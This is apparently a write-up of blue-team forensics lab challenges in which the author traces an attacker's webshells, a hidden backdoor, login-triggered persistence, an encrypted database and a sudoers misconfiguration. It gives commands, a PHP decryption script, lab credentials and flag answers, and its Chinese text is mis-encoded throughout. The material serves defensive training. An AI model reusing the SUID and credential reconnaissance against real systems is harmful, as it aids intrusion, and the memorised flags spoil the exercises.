<h1 id="ç¬¬ä¹ç« "><a href="#ç¬¬ä¹ç« " class="headerlink" title="ç¬¬ä¹ç« "></a>ç¬¬ä¹ç« </h1><h2 id="blueteam-çš„å°å¿ƒæ€"><a href="#blueteam-çš„å°å¿ƒæ€" class="headerlink" title="blueteam çš„å°å¿ƒæ€"></a>blueteam çš„å°å¿ƒæ€</h2><h4 id="ä»»åŠ¡ä¸€-24"><a href="#ä»»åŠ¡ä¸€-24" class="headerlink" title="ä»»åŠ¡ä¸€"></a>ä»»åŠ¡ä¸€</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ”»å‡»è€…é€šè¿‡ä»€ä¹ˆå¯†ç æˆåŠŸç™»å½•äº†ç½‘ç«™çš„åå°ï¼Ÿæäº¤å¯†ç å­—ç¬¦ä¸²çš„å°å†™md5å€¼ï¼Œæ ¼å¼flag&#123;md5&#125;ã€‚</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥å°±æ˜¯å…ˆæ‰¾æµé‡åŒ…</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -name &quot;*.pcap&quot;</span><br></pre></td></tr></table></figure>

<p>ç„¶åå°±æ˜¯æ‰¾ç™»å½•çš„æµé‡ï¼Œè¿™ä¸ªå°±å¾ˆç®€å•äº†</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-06/39b87ddd709986e39bf2e0c8ecbab645--52c0--image-20240706190032849.png" alt="image-20240706190032849"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Aa12345^</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;d63edb0e9df4cf411398e3658c0237e0&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡äºŒ-22"><a href="#ä»»åŠ¡äºŒ-22" class="headerlink" title="ä»»åŠ¡äºŒ"></a>ä»»åŠ¡äºŒ</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ”»å‡»è€…åœ¨å“ªä¸ªPHPé¡µé¢ä¸­æˆåŠŸä¸Šä¼ äº†åé—¨æ–‡ä»¶ï¼Ÿä¾‹å¦‚upload.phpé¡µé¢ï¼Œä¸Šä¼ å­—ç¬¦ä¸²&quot;upload.php&quot;çš„å°å†™md5å€¼ï¼Œæ ¼å¼flag&#123;md5&#125;ã€‚</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬ç›´æ¥å°±æ˜¯æµé‡é‡Œé¢æœç´¢ä¸€ä¸‹ï¼Œç›´æ¥å°±æ˜¯æ‰¾postæ•°æ®åŒ…ï¼Œå¾ˆæ˜æ˜¾å°±èƒ½æ‰¾åˆ°</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-06/19c3c0a3d5e83d0d88b931f852a58923--65a0--image-20240706191034662.png" alt="image-20240706191034662"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pluginmgr.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;b05c0be368ffa72e6cb2df7e1e1b27be&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡ä¸‰-22"><a href="#ä»»åŠ¡ä¸‰-22" class="headerlink" title="ä»»åŠ¡ä¸‰"></a>ä»»åŠ¡ä¸‰</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ‰¾åˆ°æ”»å‡»è€…ä¸Šä¼ çš„webshellæ–‡ä»¶ï¼Œæäº¤è¯¥æ–‡ä»¶çš„å°å†™md5å€¼ï¼Œæ ¼å¼flag&#123;md5&#125;ã€‚</span><br></pre></td></tr></table></figure>

<p>æ‰¾webshelläº†è¿™ä¸ªåˆæ˜¯ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬ç›´æ¥ä¸Šdç›¾å³å¯</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-06/e94017c1b0707ed37a9e0e152fc90e5e--a129--image-20240706190916338.png" alt="image-20240706190916338"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">md5sum cpg.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;a097b773ced57bb7d51c6719fe8fe5f5&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡å››-19"><a href="#ä»»åŠ¡å››-19" class="headerlink" title="ä»»åŠ¡å››"></a>ä»»åŠ¡å››</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ”»å‡»è€…åç»­åˆä¸‹è½½äº†ä¸€ä¸ªå¯æ‰§è¡Œçš„åé—¨ç¨‹åºï¼Œæäº¤è¯¥æ–‡ä»¶çš„å°å†™md5å€¼ï¼Œæ ¼å¼flag&#123;md5&#125;ã€‚</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥é€šè¿‡webshellçš„æ—¶é—´å»æŸ¥æ‰¾å¯æ‰§è¡Œåé—¨</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-06/812fcabd46e6c3899fcbd5fd5375b5ec--10d5--image-20240706191859333.png" alt="image-20240706191859333"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-06/1843006551a41b9713112d82371b4deb--9954--image-20240706192053882.png" alt="image-20240706192053882"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -newerct &#x27;2023-11-18 07:30:00&#x27; ! -newerct &#x27;2023-11-19 07:30:00&#x27; ! -path &#x27;/proc/*&#x27; ! -path /&#x27;sys/*&#x27; ! -path &#x27;/run/*&#x27; -type f -exec ls -lctr --full-time &#123;&#125; \+ 2&gt;/dev/null | grep www-data</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">md5sum &quot;/var/www/html/plugins/.       /is.world&quot;       // æ³¨æ„è¦åŠ æ‹¬å·</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;ee279c39bf3dcb225093bdbafeb9a439&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡äº”-12"><a href="#ä»»åŠ¡äº”-12" class="headerlink" title="ä»»åŠ¡äº”"></a>ä»»åŠ¡äº”</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ”»å‡»è€…åˆ›å»ºäº†åé—¨ç”¨æˆ·çš„åç§°æ˜¯ï¼Ÿä¾‹å¦‚attackæ¶æ„ç”¨æˆ·ï¼Œä¸Šä¼ å­—ç¬¦ä¸²&quot;attack&quot;çš„å°å†™md5å€¼ï¼Œæ ¼å¼flag&#123;md5&#125;ã€‚</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-06/810f9d182bc9232c5fcbb7178f6f0799--76c3--image-20240706192359044.png" alt="image-20240706192359044"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;4cda3461543c9a770a3349760594facd&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡å…­-4"><a href="#ä»»åŠ¡å…­-4" class="headerlink" title="ä»»åŠ¡å…­"></a>ä»»åŠ¡å…­</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ”»å‡»è€…åˆ›å»ºäº†ä¸€ä¸ªæŒä¹…åŒ–çš„é…ç½®é¡¹ï¼Œå¯¼è‡´ä»»æ„ç”¨æˆ·ç™»å½•å°±ä¼šè§¦å‘åé—¨çš„è¿æ¥ã€‚æäº¤è¯¥é…ç½®é¡¹å¯¹åº”é…ç½®æ–‡ä»¶çš„å°å†™md5å€¼ï¼Œæ ¼å¼flag&#123;md5&#125;ã€‚</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-06/06383628bb8c257b8263770d09e39a1a--48a0--202406081851134.png" alt="202406081851134"></p>
<p>ç›´æ¥å°±æ˜¯å»æ‰¾ä¸€ä¸‹è¿™äº›æ–‡ä»¶å³å¯</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-06/2bc924b1ef5c2d51d57730fbca163cbf--936d--image-20240706193401497.png" alt="image-20240706193401497"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/profile</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;65bf3e4a9ac90d75ec28be0317775618&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡ä¸ƒ-2"><a href="#ä»»åŠ¡ä¸ƒ-2" class="headerlink" title="ä»»åŠ¡ä¸ƒ"></a>ä»»åŠ¡ä¸ƒ</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ”»å‡»è€…åˆ›å»ºäº†ä¸€ä¸ªæŒä¹…åŒ–çš„é…ç½®é¡¹ï¼Œå¯¼è‡´åªæœ‰rootç”¨æˆ·ç™»å½•æ‰ä¼šè§¦å‘åé—¨çš„è¿æ¥ã€‚æäº¤è¯¥é…ç½®é¡¹å¯¹åº”é…ç½®æ–‡ä»¶çš„å°å†™md5å€¼ï¼Œæ ¼å¼flag&#123;md5&#125;ã€‚</span><br></pre></td></tr></table></figure>

<p>è¿˜æ˜¯ä¸Šé¢é‚£ä¸ªå›¾æˆ‘ä»¬æ‰¾ä¸‹å°±è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /root/.bashrc</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;4acc9c465eeeb139c194893ec0a8bcbc&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-06/a417af5542c96421a986d26e8c3e83b4--e502--image-20240706193112072.png" alt="image-20240706193112072"></p>
<h4 id="ä»»åŠ¡å…«"><a href="#ä»»åŠ¡å…«" class="headerlink" title="ä»»åŠ¡å…«"></a>ä»»åŠ¡å…«</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ”»å‡»è€…åŠ å¯†äº†å“ªä¸ªæ•°æ®åº“ï¼Ÿæäº¤æ•°æ®åº“çš„æ–‡ä»¶å¤¹åï¼Œä¾‹å¦‚useræ•°æ®åº“å¯¹åº”å­˜æ”¾ä½ç½®ä¸ºuseræ–‡ä»¶å¤¹ï¼Œä¸Šä¼ å­—ç¬¦ä¸²&quot;user&quot;çš„å°å†™md5å€¼ï¼Œæ ¼å¼flag&#123;md5&#125;ã€‚</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥å»æ‰¾åˆ°æ•°æ®åº“çš„é…ç½®æ–‡ä»¶</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-06/381373aa3989aa7703d40cd7c4e02486--e3f5--image-20240706193540148.png" alt="image-20240706193540148"></p>
<p>æˆåŠŸè·å¾—è´¦å·å’Œå¯†ç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root/mysql123</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-06/134f43a5a485b534f0618103a5068596--7d37--image-20240706193647869.png" alt="image-20240706193647869"></p>
<p>å‘ç°ä¸€ä¸ªä¸æ˜¯é»˜è®¤è‡ªå¸¦çš„åº“</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-06/0cd081645da684d815ff31e1e88655fa--1e4a--image-20240706193745014.png" alt="image-20240706193745014"></p>
<p>å‘ç°æ— æ³•ä½¿ç”¨ï¼Œæˆ‘ä»¬å°±å»æ‰¾ä¸€ä¸‹å¯¹åº”çš„æ–‡ä»¶</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-06/9ceb37cf44d2b77298ebb9fad7fe4f8b--1b5f--image-20240706194000965.png" alt="image-20240706194000965"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-06/d3dfb91ce3def7218c79678ffa230aa0--4969--image-20240706193851754.png" alt="image-20240706193851754"></p>
<p>æˆåŠŸæ‰¾åˆ°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JPMorgan@0020Chase</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;0928a5424aa6126e5923980ca103560e&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡ä¹"><a href="#ä»»åŠ¡ä¹" class="headerlink" title="ä»»åŠ¡ä¹"></a>ä»»åŠ¡ä¹</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è§£å¯†æ•°æ®åº“ï¼Œæäº¤Harperç”¨æˆ·å¯¹åº”Areerçš„å€¼ã€‚æäº¤Areerå€¼çš„å°å†™md5å€¼ï¼Œæ ¼å¼flag&#123;md5&#125;ã€‚</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆå°±æ˜¯å»å¯»æ‰¾åŠ å¯†æ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -type f -newer /var/www/html/plugins/cpg.php ! -newer /var/lib/mysql/JPMorgan@0020Chase/Balance.frm 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-06/be24a0b55ee4a7051da9f1f434023e89--648b--image-20240706194608575.png" alt="image-20240706194608575"></p>
<p>æˆ‘ä»¬è¿™å°±å†™ä¸€ä¸ªè§£å¯†è„šæœ¬å³å¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$currentDate</span> = <span class="string">&quot;2023-11-18&quot;</span>;  </span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$currentDate</span>);  </span><br><span class="line"><span class="variable">$iv</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">hash</span>(<span class="string">&#x27;sha256&#x27;</span>, <span class="string">&quot;DeepMountainsGD&quot;</span>), <span class="number">0</span>, <span class="number">16</span>);  </span><br><span class="line"><span class="variable">$filePath</span> = <span class="string">&quot;/var/lib/mysql/JPMorgan@0020Chase&quot;</span>;  </span><br><span class="line"><span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="variable">$filePath</span>);  </span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$file</span> != <span class="string">&quot;.&quot;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;..&quot;</span>) &#123;  </span><br><span class="line">        <span class="variable">$fullPath</span> = <span class="variable">$filePath</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file</span>;  </span><br><span class="line">        <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$fullPath</span>);  </span><br><span class="line">        <span class="variable">$encryptedContent</span> = <span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$content</span>, <span class="string">&#x27;aes-256-cbc&#x27;</span>, <span class="variable">$key</span>, <span class="number">0</span>, <span class="variable">$iv</span>);  </span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$fullPath</span>, <span class="variable">$encryptedContent</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç›´æ¥xshellæœåŠ¡å™¨ä¸Šè¿è¡Œå³å¯</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-06/32b645afcbe20fc0d9dcea749c4ad272--9dc7--image-20240706195427079.png" alt="image-20240706195427079"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Chef</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;8fd82b8864d71ed7fa12b59e6e34cd1c&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡å"><a href="#ä»»åŠ¡å" class="headerlink" title="ä»»åŠ¡å"></a>ä»»åŠ¡å</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å› ä¸ºä»€ä¹ˆæ–‡ä»¶ä¸­çš„æ¼æ´é…ç½®ï¼Œå¯¼è‡´äº†æ”»å‡»è€…æˆåŠŸæ‰§è¡Œå‘½ä»¤å¹¶ææƒã€‚æäº¤è¯¥æ–‡ä»¶çš„å°å†™md5å€¼ï¼Œæ ¼å¼flag&#123;md5&#125;ã€‚</span><br></pre></td></tr></table></figure>

<p>è¿™å°±ç›²çŒœæ˜¯sudoææƒ</p>
<p>ç›´æ¥å‘½ä»¤å»æ‰¾</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-06/d9629e0407c7e72e3520acbcc09472b4--3f0e--image-20240706195850300.png" alt="image-20240706195850300"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-06/0351357f4d9eb3cae867ac3f74009df6--b48a--image-20240706200021392.png" alt="image-20240706200021392"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/sudoers</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;6585817513b0ea96707ebb0d04d6aeff&#125;</span><br></pre></td></tr></table></figure>

<h2 id="NOP-Team-dmz-A"><a href="#NOP-Team-dmz-A" class="headerlink" title="NOP Team dmz-A"></a>NOP Team dmz-A</h2><h4 id="ä»»åŠ¡ä¸€-25"><a href="#ä»»åŠ¡ä¸€-25" class="headerlink" title="ä»»åŠ¡ä¸€"></a>ä»»åŠ¡ä¸€</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1ã€è¯·æäº¤ç¦…é“çš„ç‰ˆæœ¬å·ï¼Œæ ¼å¼: flag&#123;xx.xxx.xxxx&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-06/e4776ded09ffd7f6a372f0edf3293b6b--f411--image-20240706201518896.png" alt="image-20240706201518896"></p>
<p>ç›´æ¥å°±æ˜¯èƒ½çœ‹åˆ°ç‰ˆæœ¬çš„</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;18.0.beta1&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡äºŒ-23"><a href="#ä»»åŠ¡äºŒ-23" class="headerlink" title="ä»»åŠ¡äºŒ"></a>ä»»åŠ¡äºŒ</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2ã€åˆ†ææ”»å‡»è€…ä½¿ç”¨äº†ä»€ä¹ˆå·¥å…·å¯¹å†…ç½‘ç¯å¢ƒè¿›è¡Œäº†ä¿¡æ¯æ”¶é›†ï¼Œå°†è¯¥å·¥å…·åç§°æäº¤ flag&#123;xxxx&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-06/fb6da266eee587f8fce3a36ca7282ef1--0496--image-20240706201623466.png" alt="image-20240706201623466"></p>
<p>å¯ä»¥å¾ˆæ˜æ˜¾çš„æ‰¾åˆ°fscan</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;fscan&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡ä¸‰-23"><a href="#ä»»åŠ¡ä¸‰-23" class="headerlink" title="ä»»åŠ¡ä¸‰"></a>ä»»åŠ¡ä¸‰</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3ã€æ”»å‡»è€…æ”»å‡»æœåŠ¡å™¨å¾—åˆ°shellä»¥åï¼Œæ˜¯å¤„äºå“ªä¸ªç”¨æˆ·ä¸‹åšçš„æ“ä½œï¼Œå°†è¯¥ç”¨æˆ·åæäº¤ flag&#123;xxxx&#125;</span><br></pre></td></tr></table></figure>

<p>æœ‰ä¸Šé¢æˆ‘ä»¬çŸ¥é“äº†å¯¹åº”çš„ç‰ˆæœ¬ï¼Œå°±å¯ä»¥ç›´æ¥ç½‘ä¸Šæ‰¾å¯¹åº”çš„pocå»æ”»å‡»</p>
<p><a href="https://blog.csdn.net/qq_41904294/article/details/128838423">https://blog.csdn.net/qq_41904294/article/details/128838423</a></p>
<p>ç„¶åæ ¹æ®å¯¹åº”çš„pocå»æµé‡åŒ…ä¸­å¯»æ‰¾http contains â€œSCM&#x3D;Subversionâ€</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;nobody&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡å››-20"><a href="#ä»»åŠ¡å››-20" class="headerlink" title="ä»»åŠ¡å››"></a>ä»»åŠ¡å››</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4ã€æ”»å‡»è€…æ‰«æåˆ°å†…ç½‘ DMZ-Bæœºå™¨çš„è´¦æˆ·å¯†ç ä¸ºå¤šå°‘æ ¼å¼ flag&#123;root:root&#125;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥å»æŸ¥çœ‹fscanæ‰«å‡ºæ¥çš„ç»“æœå³å¯</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-06/8eade7634b43a3d2bcbdca198a0e3536--1efe--image-20240706202418896.png" alt="image-20240706202418896"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;admin:123456&#125;</span><br></pre></td></tr></table></figure>

<h2 id="NOP-Team-dmz-B"><a href="#NOP-Team-dmz-B" class="headerlink" title="NOP Team dmz-B"></a>NOP Team dmz-B</h2><h4 id="ä»»åŠ¡ä¸€-26"><a href="#ä»»åŠ¡ä¸€-26" class="headerlink" title="ä»»åŠ¡ä¸€"></a>ä»»åŠ¡ä¸€</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1ã€æ”»å‡»è€…é€šè¿‡DMZ-Aç™»é™†åˆ°DMZ-Bæœºå™¨é‡Œï¼Œåœ¨ä¸Šé¢å‘ç°äº†DMZ-Cæœºå™¨é‡Œçš„ä¸€ä¸ªå¯†é’¥ï¼Œé€šè¿‡æŸæœåŠ¡ç›´æ¥è¿›è¡Œäº†ç™»é™†ï¼Œè¯·å°†æœåŠ¡åä¸ç™»å‘³çš„ç”¨æˆ·åæäº¤&lt;æ ¼å¼</span><br><span class="line">flag&#123;ftp:anonymous&#125;&gt;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥å°±æ˜¯é€šè¿‡historyå‘½ä»¤å»æŸ¥çœ‹å†å²å‘½ä»¤å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;ssh:deploy&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Where-1S-tHe-Hacker"><a href="#Where-1S-tHe-Hacker" class="headerlink" title="Where-1S-tHe-Hacker"></a>Where-1S-tHe-Hacker</h2><h4 id="ä»»åŠ¡ä¸€-27"><a href="#ä»»åŠ¡ä¸€-27" class="headerlink" title="ä»»åŠ¡ä¸€"></a>ä»»åŠ¡ä¸€</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é€šè¿‡æœ¬åœ° PC RDPåˆ°æœåŠ¡å™¨å¹¶ä¸”æ‰¾åˆ°é»‘å®¢ID ä¸ºå¤šå°‘,å°†é»‘å®¢ID ä½œä¸º FLAG æäº¤;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-11/d82db2d18bdfe7e37e4f453ee9ca2ca6--005e--image-20240711152853286.png" alt="image-20240711152853286"></p>
<p>ç›´æ¥å°±æ˜¯èƒ½å¤Ÿæ‰¾åˆ°çš„</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;X123567X&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡äºŒ-24"><a href="#ä»»åŠ¡äºŒ-24" class="headerlink" title="ä»»åŠ¡äºŒ"></a>ä»»åŠ¡äºŒ</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é€šè¿‡æœ¬åœ° PC RDPåˆ°æœåŠ¡å™¨å¹¶ä¸”æ‰¾åˆ°é»‘å®¢åœ¨ä»€ä¹ˆæ—¶é—´ä¿®æ”¹äº†ç½‘ç«™ä¸»é¡µ,å°†é»‘å®¢ä¿®æ”¹äº†ç½‘ç«™ä¸»é¡µçš„æ—¶é—´ ä½œä¸º FLAG æäº¤ï¼ˆy-m-d-4:22:33ï¼‰;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥å°±æ˜¯å³é”®è¯¦ç»†å°±èƒ½çœ‹åˆ°ä¿®æ”¹æ—¶é—´äº†</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-11/b5d4237a8b0b71e5709107185cd39e36--c804--image-20240711153826509.png" alt="image-20240711153826509"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;2023-11-6-4:55:13&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡ä¸‰-24"><a href="#ä»»åŠ¡ä¸‰-24" class="headerlink" title="ä»»åŠ¡ä¸‰"></a>ä»»åŠ¡ä¸‰</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é€šè¿‡æœ¬åœ° PC RDPåˆ°æœåŠ¡å™¨å¹¶ä¸”æ‰¾åˆ°é»‘å®¢ç¬¬ä¸€ä¸ªwebshellæ–‡ä»¶åæ˜¯,å°†ç¬¬ä¸€ä¸ªwebshellæ–‡ä»¶å ä½œä¸ºFLAG æäº¤;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;SystemConfig.php&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡å››-21"><a href="#ä»»åŠ¡å››-21" class="headerlink" title="ä»»åŠ¡å››"></a>ä»»åŠ¡å››</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é€šè¿‡æœ¬åœ° PC RDPåˆ°æœåŠ¡å™¨å¹¶ä¸”æ‰¾åˆ°é»‘å®¢ç¬¬ä¸€ä¸ªwebshellæ–‡ä»¶åæ˜¯,å°†ç¬¬ä¸€ä¸ªwebshellæ–‡ä»¶å ä½œä¸ºFLAG æäº¤;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªä¹Ÿæ˜¯å¯ä»¥å»çœ‹ä¸€ä¸‹ä¿®æ”¹æ—¥æœŸï¼Œå¾ˆå®¹æ˜“å°±èƒ½å¤Ÿæ‰¾åˆ°äº†</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-11/9081d245f6c7ade98088dceaf129e6fe--a458--image-20240711154224207.png" alt="image-20240711154224207"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;syscon.php&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡äº”-13"><a href="#ä»»åŠ¡äº”-13" class="headerlink" title="ä»»åŠ¡äº”"></a>ä»»åŠ¡äº”</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é€šè¿‡æœ¬åœ° PC RDPåˆ°æœåŠ¡å™¨å¹¶ä¸”æ‰¾åˆ°é»‘å®¢ç¬¬äºŒä¸ªwebshellçš„è¿æ¥å¯†ç æ˜¯,å°†ç¬¬äºŒä¸ªwebshellçš„è¿æ¥å¯†ç  ä½œä¸ºFLAG æäº¤;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªä¹Ÿæ˜¯å¾ˆç®€å•ï¼Œç›´æ¥ç‚¹å¼€æœ¨é©¬æ–‡ä»¶å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;pass&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡å…­-5"><a href="#ä»»åŠ¡å…­-5" class="headerlink" title="ä»»åŠ¡å…­"></a>ä»»åŠ¡å…­</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é€šè¿‡æœ¬åœ° PC RDPåˆ°æœåŠ¡å™¨å¹¶ä¸”æ‰¾åˆ°é»‘å®¢æ–°å»ºçš„éšè—è´¦æˆ·,å°†æ–°å»ºçš„éšè—è´¦æˆ·åå­— ä½œä¸ºFLAG æäº¤;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-11/d242f28a542dc10ed7a1b052953f79fd--4c7b--image-20240711155410828.png" alt="image-20240711155410828"></p>
<p>æˆåŠŸåˆ›å»ºäº†æ–°è´¦æˆ·</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c</span><br></pre></td></tr></table></figure>

